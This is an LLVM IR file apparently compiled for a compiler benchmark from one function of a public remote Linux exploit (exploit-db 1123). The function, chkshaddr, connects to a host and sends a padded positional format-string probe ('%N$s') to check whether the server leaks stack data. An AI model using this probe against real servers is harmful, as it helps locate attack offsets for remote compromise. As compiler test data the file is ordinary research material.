; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_chkshaddr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_chkshaddr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFERSIZE = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [13 x i8] c"BBBBBBBBBBBB\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"%%%u$s\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"$s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @chkshaddr(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca %struct.hostent*, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  %17 = load i32, i32* @BUFFERSIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %8, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %9, align 8
  %21 = load i32, i32* @BUFFERSIZE, align 4
  %22 = zext i32 %21 to i64
  %23 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %10, align 8
  %24 = load i32, i32* @BUFFERSIZE, align 4
  %25 = zext i32 %24 to i64
  %26 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %11, align 8
  store i8* null, i8** %12, align 8
  %27 = load i8*, i8** %5, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %13, align 8
  %29 = trunc i64 %18 to i32
  %30 = call i32 @bzero(i8* %20, i32 %29)
  %31 = load i32, i32* @AF_INET, align 4
  %32 = load i32, i32* @SOCK_STREAM, align 4
  %33 = call i32 @socket(i32 %31, i32 %32, i32 0)
  store i32 %33, i32* %15, align 4
  %34 = load i32, i32* @AF_INET, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  store i32 %34, i32* %35, align 4
  %36 = load i32, i32* %6, align 4
  %37 = call i32 @htons(i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %37, i32* %38, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %40 = load %struct.hostent*, %struct.hostent** %13, align 8
  %41 = getelementptr inbounds %struct.hostent, %struct.hostent* %40, i32 0, i32 0
  %42 = load i64, i64* %41, align 8
  %43 = inttoptr i64 %42 to %struct.in_addr*
  %44 = bitcast %struct.in_addr* %39 to i8*
  %45 = bitcast %struct.in_addr* %43 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %44, i8* align 4 %45, i64 4, i1 false)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  %47 = call i32 @bzero(i8* %46, i32 8)
  %48 = load i32, i32* %15, align 4
  %49 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %50 = load i32, i32* @TIMEOUT, align 4
  %51 = call i32 @connect_timeout(i32 %48, %struct.sockaddr* %49, i32 4, i32 %50)
  %52 = load i32, i32* %15, align 4
  %53 = trunc i64 %18 to i32
  %54 = call i32 @read(i32 %52, i8* %20, i32 %53)
  %55 = trunc i64 %22 to i32
  %56 = call i32 @memset(i8* %23, i32 0, i32 %55)
  %57 = call i32 @memset(i8* %23, i32 65, i32 496)
  %58 = call i32 @strcat(i8* %23, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %59 = load i32, i32* %7, align 4
  %60 = call i32 @sprintf(i8* %26, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i32 %59)
  %61 = call i32 @strcat(i8* %23, i8* %26)
  %62 = load i32, i32* %15, align 4
  %63 = call i32 @strlen(i8* %23)
  %64 = call i32 @write(i32 %62, i8* %23, i32 %63)
  %65 = load i32, i32* %15, align 4
  %66 = trunc i64 %18 to i32
  %67 = call i32 @read(i32 %65, i8* %20, i32 %66)
  %68 = load i32, i32* %15, align 4
  %69 = call i32 @close(i32 %68)
  %70 = call i64 @strstr(i8* %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %73

72:                                               ; preds = %3
  store i32 1, i32* %4, align 4
  store i32 1, i32* %16, align 4
  br label %74

73:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  store i32 1, i32* %16, align 4
  br label %74

74:                                               ; preds = %73, %72
  %75 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %75)
  %76 = load i32, i32* %4, align 4
  ret i32 %76
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i64 @strstr(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
